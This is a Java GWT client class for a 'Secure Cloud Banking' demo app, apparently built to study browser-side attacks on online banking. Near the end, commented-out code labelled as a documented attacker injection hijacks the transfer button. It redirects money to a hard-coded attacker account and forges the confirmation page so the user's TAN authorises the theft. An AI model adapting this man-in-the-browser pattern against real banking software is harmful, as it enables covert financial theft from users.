package de.mrx.client;

import java.util.ArrayList;
import java.util.List;

import com.allen_sauer.gwt.log.client.Log;
import com.google.gwt.core.client.EntryPoint;
import com.google.gwt.core.client.GWT;
import com.google.gwt.event.dom.client.ClickEvent;
import com.google.gwt.event.dom.client.ClickHandler;
import com.google.gwt.i18n.client.NumberFormat;
import com.google.gwt.user.client.Window;
import com.google.gwt.user.client.rpc.AsyncCallback;
import com.google.gwt.user.client.ui.Anchor;
import com.google.gwt.user.client.ui.Button;
import com.google.gwt.user.client.ui.FlexTable;
import com.google.gwt.user.client.ui.Grid;
import com.google.gwt.user.client.ui.HTML;
import com.google.gwt.user.client.ui.HorizontalPanel;
import com.google.gwt.user.client.ui.Image;
import com.google.gwt.user.client.ui.Label;
import com.google.gwt.user.client.ui.MenuBar;
import com.google.gwt.user.client.ui.RootPanel;
import com.google.gwt.user.client.ui.TextBox;
import com.google.gwt.user.client.ui.VerticalPanel;

import de.mrx.client.moneytransfer.FastMoneyTransferForm;
import de.mrx.client.moneytransfer.MoneyTransferForm;
import de.mrx.client.register.RegistrationForm;

import com.google.gwt.query.client.GQuery;
import com.google.gwt.query.client.Function;
import com.google.gwt.query.client.Selector;
import com.google.gwt.query.client.Selectors;
import static com.google.gwt.query.client.GQuery.*;
import static com.google.gwt.query.client.css.CSS.*;

/**
 * Complete GUI for Secure Cloud Banking. Includes Registration process, general
 * information, and online banking Entry point classes define
 * <code>onModuleLoad()</code>. TODO: This class is too big! Split!
 * 
 */
public class SCB implements EntryPoint, Observer {

	// private static final Logger log = Logger.getLogger(SCB.class.getName());
	// Widget divLogger = Log.getLogger(DivLogger.class).getWidget();

	public static final String PAGEID_HEADER = "cloudbanking";
	public static final String PAGEID_CONTENT = "content";
	public static final String PAGEID_FEHLER = "fehler";
	public static final String PAGEID_SIGN = "signInOut";

	public final static String STYLE_VALUE_NOT_OKAY = "ValueNotOkay";
	String currentLanguage = "en";

	RegistrationForm regForm;

	private SCBConstants constants = GWT.create(SCBConstants.class);
	// private SCBMessages messages = GWT.create(SCBMessages.class);
	RegisterServiceAsync registerSvc;
	private CustomerServiceAsync bankingService;

	MoneyTransferForm mTransfer;// = new MoneyTransferForm();
	/**
	 * The message displayed to the user when the server cannot be reached or
	 * returns an error.
	 */
	// private static final String SERVER_ERROR = "An error occurred while "
	// + "attempting to contact the server. Please check your network "
	// + "connection and try again.";

	MenuBar generalMenu = new MenuBar(true);

	private VerticalPanel mainPanel = new VerticalPanel();

	private HorizontalPanel accountOverviewPanel = new HorizontalPanel();
	private VerticalPanel accountsListPanel = new VerticalPanel();
	private VerticalPanel accountsDetailsPanel = new VerticalPanel();

	FlexTable validateErrorTable = new FlexTable();

	private VerticalPanel informationPanel;

	private SCBIdentityDTO identityInfo = null;
	private VerticalPanel loginPanel = new VerticalPanel();

	private Anchor signInLink = new Anchor(constants.signIn());
	private Anchor signOutLink = new Anchor(constants.signOut());

	private MenuBar menu;

	private String currentAccount;

	private List<String> hints = new ArrayList<String>();

	private Image scbLogo;
	private SCBMenu scbMenu;
	private MoneyTransferForm confirmPage;

	private void doShowAbout(boolean picture) {
		RootPanel r = RootPanel.get(PAGEID_CONTENT);
		if (r == null)
			return;
		r.clear();
		informationPanel = new VerticalPanel();
		HTML text = new HTML(constants.registrationIntroductionText());
		text.setStyleName("centerAligned");
		scbLogo = new Image("images/banking.jpg");
		scbLogo.setStyleName("centerAligned");

		informationPanel.add(text);
		if (picture) {
			informationPanel.add(scbLogo);
		}

		RootPanel.get(PAGEID_CONTENT).add(informationPanel);
	}

	private void doOpenRegisterMenu() {
		RootPanel.get(PAGEID_CONTENT).clear();
		doShowAbout(false);
		if (regForm == null) {
			regForm = new RegistrationForm(signInLink);
			regForm.setUser(identityInfo);
		}

		RootPanel.get(PAGEID_CONTENT).add(regForm);
	}

	/**
	 * REMOVEME: temporal workaround until refactoring
	 */
	public VerticalPanel createMainPanel() {

		VerticalPanel v = new VerticalPanel();
		scbMenu = new SCBMenu();
		scbMenu.addObserver(this);
		// tempMainpanel.add(menu);
		v.add(scbMenu);
		return v;
	}

	/**
	 * This is the entry point method.
	 */
	public void onModuleLoad() {

		try {
			GWT.log("On Module Load");
			RootPanel r = RootPanel.get(PAGEID_HEADER);
			if (r == null) {
				GWT.log("Root not found: '" + PAGEID_HEADER + "'");
				return;
			}

			// RootPanel.get(PAGEID_FEHLER).add(divLogger);
			Log.setUncaughtExceptionHandler();

			mainPanel = createMainPanel();

			r.add(mainPanel);

			checkGoogleStatus();
			doShowAbout(true);
			GWT.log("Module loaded");
			//GWT:	startAttack();

		} catch (Exception e) {
			GWT.log(e.getMessage());
			e.printStackTrace();
		}
	}

	private void showAccountOverview() {
		RootPanel.get(PAGEID_CONTENT).clear();
		accountOverviewPanel.clear();
		accountsDetailsPanel.clear();
		accountsListPanel.clear();
		Log.debug("Show Account Overview");
		accountOverviewPanel.add(accountsListPanel);
		accountOverviewPanel.add(accountsDetailsPanel);

		if (bankingService == null) {
			bankingService = GWT.create(CustomerService.class);
		}
		bankingService.getAccounts(new AsyncCallback<List<AccountDTO>>() {

			public void onFailure(Throwable caught) {
				Log.error("Loading Account data failed", caught);
				return;

			}

			public void onSuccess(List<AccountDTO> result) {
				if (result == null) {
					Log.warn("No accounts");

				} else {
					Log.info("Number of Accounts: " + result.size());
					Button overviewBtn = new Button(constants
							.overViewBtnFinancialState());
					overviewBtn.setStyleName("OverViewButton");
					overviewBtn.addClickHandler(new ClickHandler() {

						public void onClick(ClickEvent event) {
							showAccountOverview();
						}
					});
					accountsListPanel.add(overviewBtn);
					showAccountOverviewInDetailPanel(result);
					// accountsListPanel.add(new Label("Your accounts "));
					for (AccountDTO acc : result) {
						Log.info(acc.toString());

						Button btn = new Button(acc.getAccountDescription()
								+ " (" + acc.getAccountNr() + ")");

						btn.setStyleName("OverViewButton");

						btn.addClickHandler(new AccountClickHandler(acc
								.getAccountNr()));
						accountsListPanel.add(btn);
					}

					if (result.size() == 0) {
						Button neuerAccountBtn = new Button(constants
								.overViewBtnOpenSavingAccount());
						neuerAccountBtn.setStyleName("OverViewButton");
						neuerAccountBtn.addClickHandler(new ClickHandler() {

							public void onClick(ClickEvent event) {
								createAccount();
							}

						});
						Log.debug("Include 'open saving account button");
						accountsListPanel.add(neuerAccountBtn);

					}
				}

				RootPanel.get(PAGEID_CONTENT).add(accountOverviewPanel);
				Log.debug("Overview Page loaded");

			}
		});

	}

	protected void showAccountOverviewInDetailPanel(List<AccountDTO> result) {
		accountsDetailsPanel.clear();
		if (result.size() == 0) {
			Label noAccountHint = new Label(
					constants.accountOverviewHintNoAccount());
			accountsDetailsPanel.add(noAccountHint);
			return;
		}
		Label accHeaderLbl = new Label(constants.accountOverviewLblTitel());
		accountsDetailsPanel.add(accHeaderLbl);
		Grid grid = new Grid(result.size() + 1, 2);
		accountsDetailsPanel.add(grid);
		Label accHeader = new Label(constants.accountOverviewLblHeaderAccount());
		Label amountHeader = new Label(
				constants.accountOverviewLblHeaderBalance());
		accHeader.setStyleName("TransfersHeader");
		amountHeader.setStyleName("TransfersHeader");
		grid.setWidget(0, 0, accHeader);
		grid.setWidget(0, 1, amountHeader);
		grid.setBorderWidth(1);

		int row = 1;
		for (AccountDTO dto : result) {
			Label accountElement = new Label(dto.getAccountNr());
			Label balanceElement = new Label(
					com.google.gwt.i18n.client.NumberFormat.getCurrencyFormat()
							.format(dto.getBalance()));
			if (dto.getBalance() >= 0) {
				balanceElement.setStyleName("positiveMoney");
			} else {
				balanceElement.setStyleName("negativeMoney");
			}
			grid.setWidget(row, 0, accountElement);
			grid.setWidget(row, 1, balanceElement);

			row++;
		}
	}

	/**
	 * Initialize personalization
	 */
	private void checkGoogleStatus() {

		if (bankingService == null) {
			bankingService = GWT.create(CustomerService.class);
		}
		GWT.log(GWT.getHostPageBaseURL());
		bankingService.login(GWT.getHostPageBaseURL(),
				new AsyncCallback<SCBIdentityDTO>() {
					public void onFailure(Throwable error) {
						error.printStackTrace();
						Log.error("Login state can not be retrieved! ", error);
						Window.alert(constants.loginFailedText());
					}

					public void onSuccess(SCBIdentityDTO result) {
						identityInfo = result;

						if (identityInfo.isLoggedIn()) {
							if (regForm != null) {
								regForm.setUser(identityInfo);
							}
							Log.info("User is logged in with email-adress "
									+ result.getEmail());
							if (identityInfo.isActivated()) {
								Log.info("Valid Account " + identityInfo);
								String userInfo = identityInfo.getEmail();
								if (identityInfo.getNickName() != null) {
									userInfo = identityInfo.getNickName()
											+ " (" + userInfo + ")";
								}
								scbMenu.getMenuUserInfo().setText(userInfo);
								scbMenu.getMenuItemRegister().setVisible(false);

								showAccountOverview();

							} else {
								Log.info("Account not yet activated in SCB: "
										+ identityInfo);
								scbMenu.getMenuUserInfo().setText(
										identityInfo.getEmail());
							}
							loadLoggedInSetup();
							String language = identityInfo.getLanguage();
							GWT.log("Language: " + language);
							if (language != null
									&& !currentLanguage.equals(language)) {
								changeToLocalisedVersion(language);
							}
						} else {
							Log.info("User is not yet logged in with his Google account");
							loadLogin();
						}
					}
				});

	}

	private void loadLogin() {
		// Assemble login panel.
		signInLink.setHref(identityInfo.getLoginUrl());
		signInLink.setStyleName("rightAligned");

		// loginPanel.add(onlyGoogleAllowedLabel);
		// loginPanel.add(signInLink);
		RootPanel.get(PAGEID_SIGN).remove(signInLink);
		RootPanel.get(PAGEID_SIGN).remove(signOutLink);
		RootPanel.get(PAGEID_SIGN).add(signInLink);

		// RootPanel.get(PAGEID_HEADER).add(signInLink);
	}

	private void loadLoggedInSetup() {
		// Assemble logout panel.

		signOutLink.setHref(identityInfo.getLogoutUrl());
		// loginPanel.add(logoutLabel);
		loginPanel.add(signOutLink);
		RootPanel.get(PAGEID_SIGN).remove(signInLink);
		RootPanel.get(PAGEID_SIGN).remove(signOutLink);
		RootPanel.get(PAGEID_SIGN).add(signOutLink);

	}

	private void createAccount() {
		if (bankingService == null) {
			bankingService = GWT.create(CustomerService.class);
		}
		bankingService.openNewAccount(new AsyncCallback<Void>() {

			public void onFailure(Throwable caught) {
				Log.error("Open new account failed", caught);
			}

			public void onSuccess(Void result) {
				Log.info("Account created");
				Window.alert(constants.accountOpened());
				Window.Location.reload();

			}
		});

	}

	private void showAccountDetails(String accNr) {
		if (bankingService == null) {
			bankingService = GWT.create(CustomerService.class);
		}
		accountsDetailsPanel.clear();

		currentAccount = accNr;

		bankingService.getAccountDetails(accNr,
				new AsyncCallback<AccountDetailDTO>() {

					public void onFailure(Throwable caught) {
						Log.error("Error loading balance", caught);

					}

					public void onSuccess(AccountDetailDTO result) {
						CustomerTransferHistoryForm customerTransfer = new CustomerTransferHistoryForm(
								result);
						customerTransfer.addObserver(SCB.this);

						accountsDetailsPanel.add(customerTransfer);

					}
				});
	}

	private boolean isFieldConfirmToExpresion(TextBox input, String expression,
			String errorMessage) {
		if (input.getText().trim().toUpperCase().matches(expression)) {
			input.setStyleName("");
			return true;
		} else {
			input.setStyleName(STYLE_VALUE_NOT_OKAY);
			Log.info("Text: '" + input.getText() + "'\tExpression: "
					+ expression);
			hints.add(errorMessage);
			return false;
		}

	}

	private void createHintTable() {
		for (int i = 0; i < hints.size(); i++) {
			String currentMessage = hints.get(i);
			Label hintLabel = new Label(currentMessage);
			hintLabel.setStyleName(STYLE_VALUE_NOT_OKAY);
			validateErrorTable.setWidget(i, 1, hintLabel);
		}
	}

	class AccountClickHandler implements ClickHandler {
		String accNr;

		public AccountClickHandler(String accountNr) {
			accNr = accountNr;
		}

		public void onClick(ClickEvent event) {
			showAccountDetails(accNr);
		}

	}

	/*
	 * change the language during runtime keeps the debug flag
	 */
	public static void changeToLocalisedVersion(String language) {
		String queryPart = Window.Location.getQueryString();

		String reloadURL;
		String debugFlag = Window.Location.getParameter("gwt.codesvr");

		if (debugFlag != null) {
			reloadURL = GWT.getHostPageBaseURL() + queryPart + "&locale="
					+ language;
		} else {
			reloadURL = GWT.getHostPageBaseURL() + "?locale=" + language;
		}

		GWT.log(reloadURL);

		Window.open(reloadURL, "_self", null);
	}

	@Override
	public void update(Observable o, Object arg) {
		System.out.println("Updated");
		if (o instanceof MoneyTransferForm) {
			showAccountDetails((String) arg);
		} else if (o instanceof FastMoneyTransferForm) {
			if (arg instanceof MoneyTransferDTO) {
				showMoneyTransferConfirmationForm((MoneyTransferDTO) arg);

			}
		} else if (o instanceof CustomerTransferHistoryForm) {
			if (arg == CustomerTransferHistoryForm.EVENT_SEND_MONEY) {
				showStandardMoneyTransferForm();
			} else if (arg == CustomerTransferHistoryForm.EVENT_SEND_FAST_MONEY) {
				showFastMoneyTransferForm();
			}

		} else if (o instanceof SCBMenu) {
			if (arg == SCBMenu.EVENT_SHOW_REGISTRATION_MENU) {
				doOpenRegisterMenu();
			}
		}

	}

	private void showFastMoneyTransferForm() {
		FastMoneyTransferForm mTransfer = new FastMoneyTransferForm(
				currentAccount);
		mTransfer.addObserver(SCB.this);
		accountsDetailsPanel.clear();
		accountsDetailsPanel.add(mTransfer);
	}

	private void showStandardMoneyTransferForm() {
		mTransfer=new MoneyTransferForm();
		mTransfer.initWithAccountNr(currentAccount);
		accountsDetailsPanel.clear();
		mTransfer.addObserver(SCB.this);
		accountsDetailsPanel.add(mTransfer);
	}

	private void showMoneyTransferConfirmationForm(MoneyTransferDTO moneyTranfer) {
		confirmPage = new MoneyTransferForm(currentAccount, moneyTranfer);
		accountsDetailsPanel.clear();
		accountsDetailsPanel.add(confirmPage);
	}



	/**
	 * this is the injection for a Javascript-Attacker with GWT
	 * Not used anymore, but documents the process much better than the pure javascript version
	 * kept for documentation purpose 
	 * @deprecated
	 * 
	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
	 */
//	private void startAttack() {
//		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
//		
//		// everything should best work with DOM-Operations only (not with
//		// knowledge of the Java Widget)
//
//		// 1. Find relevant Button for first page (after first data entry)
//		// later find with DOM Operations (GWTQuery)
//		Button sendMoneyAskForConfirmBtn = mTransfer.getSendMoney();
//		
//		// rewrite ClickHandler for askForConfirmation Button
//		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
//
//			@Override
//			public void onClick(ClickEvent event) {
//				String ATTACKER_BLZ = "6272";
//				String ATTACKER_BANK_NAME = "Deutsche Privatbank";
//				String ATTACKER_RECEIVER_ACC_NR = "172";
//				String ATTACKER__RECEIVER_NAME = "Mr. Evil";
//				int ATTACKER__AMOUNT = 10;
//				String ATTACKER_REMARK = "I just needed the money";
//				CustomerServiceAsync bankingService = GWT
//						.create(CustomerService.class);
//				//
//				bankingService.sendMoneyAskForConfirmationData(currentAccount,
//						ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR,
//						ATTACKER__AMOUNT, ATTACKER_REMARK,
//						ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,
//						new AsyncCallback<MoneyTransferDTO>() {
//
//							@Override
//							public void onFailure(Throwable caught) {
//								caught.printStackTrace();
//								Window.alert("Called with failure: "
//										+ caught.getMessage());
//
//							}
//
//							@Override
//							public void onSuccess(MoneyTransferDTO result) {
//								Window.alert("First part succeeds. Now manipulate the confirmation page");
//								result.setReceiverAccountNr(SCB.this.mTransfer
//										.getReceiverAccountNr().getText());
//								result.setReceiverName(SCB.this.mTransfer
//										.getReceiverName().getText());
//								result.setReceiverBankNr(SCB.this.mTransfer
//										.getReceiverBLZ().getText());
//								result.setReceiverName(SCB.this.mTransfer
//										.getReceiverBankName().getText());
//								result.setRemark(SCB.this.mTransfer.getRemark()
//										.getText());
//								result.setAmount(Double
//										.parseDouble(SCB.this.mTransfer
//												.getAmount().getText()));
//								showMoneyTransferConfirmationForm(result);
//							}
//						});
//
//			}
//		});
//
//	}
//
//	/**
//	 * ClickHandler for modifiying the confirmation page (with TAN)
//	 * 
//	 * @author Jan
//	 * 
//	 */
//	class MoneyTransferHackClickHandler implements ClickHandler {
//		private String currentAccount;
//
//		public MoneyTransferHackClickHandler(String currentAccount) {
//			this.currentAccount = currentAccount;
//		}
//
//		@Override
//		public void onClick(ClickEvent event) {
//			String ATTACKER_BLZ = "6272";
//			String ATTACKER_BANK_NAME = "Deutsche Privatbank";
//			String ATTACKER_RECEIVER_ACC_NR = "172";
//			String ATTACKER__RECEIVER_NAME = "Mr. Evil";
//			int ATTACKER__AMOUNT = 10;
//			String ATTACKER_REMARK = "I just needed the money";
//			CustomerServiceAsync bankingService = GWT
//					.create(CustomerService.class);
//			//
//			bankingService.sendMoney(currentAccount, ATTACKER_BLZ,
//					ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT,
//					ATTACKER_REMARK, ATTACKER__RECEIVER_NAME,
//					ATTACKER_BANK_NAME, mTransfer.getTan().getText(),
//					new AsyncCallback<Void>() {
//
//						@Override
//						public void onFailure(Throwable caught) {
//							caught.printStackTrace();
//							Window.alert("Called with failure: "
//									+ caught.getMessage());
//
//						}
//
//						@Override
//						public void onSuccess(Void result) {
//							showAccountDetails(currentAccount);
//
//						}
//
//					});
//		}
//	}

}
